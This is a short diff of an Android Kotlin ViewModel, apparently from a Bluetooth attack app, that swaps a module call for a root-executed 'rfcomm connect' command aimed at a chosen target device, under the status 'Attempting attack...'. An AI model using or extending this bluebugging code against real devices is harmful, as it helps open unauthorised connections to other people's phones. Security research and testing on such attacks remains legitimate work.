@@ -11,9 +11,12 @@ import com.hereliesaz.blusnu.data.TargetDevice
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
+import com.hereliesaz.blusnu.utils.RootExecutor
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import java.io.DataOutputStream
+import java.io.InputStream
 
 class BluebuggingViewModel(application: Application, deviceRepository: DeviceRepository) : AndroidViewModel(application) {
 
@@ -29,7 +32,6 @@ class BluebuggingViewModel(application: Application, deviceRepository: DeviceRep
     private val _devices = MutableStateFlow<List<TargetDevice>>(emptyList())
     val devices: StateFlow<List<TargetDevice>> = _devices.asStateFlow()
 
-    private val bluebuggingModule = BluebuggingModule()
     private val bluetoothAdapter: BluetoothAdapter? = (application.getSystemService(BluetoothManager::class.java) as BluetoothManager).adapter
 
     var hasPermissions = false
@@ -65,10 +67,9 @@ class BluebuggingViewModel(application: Application, deviceRepository: DeviceRep
         } ?: return
 
         viewModelScope.launch {
-            _status.value = "Connecting..."
-            val result = withContext(Dispatchers.IO) {
-                bluebuggingModule.executeAttack(device)
-            }
+            _status.value = "Attempting attack..."
+            val command = "rfcomm connect 0 ${device.address} 1"
+            val result = RootExecutor.execute(command)
             _status.value = "Finished"
             _result.value = result
         }
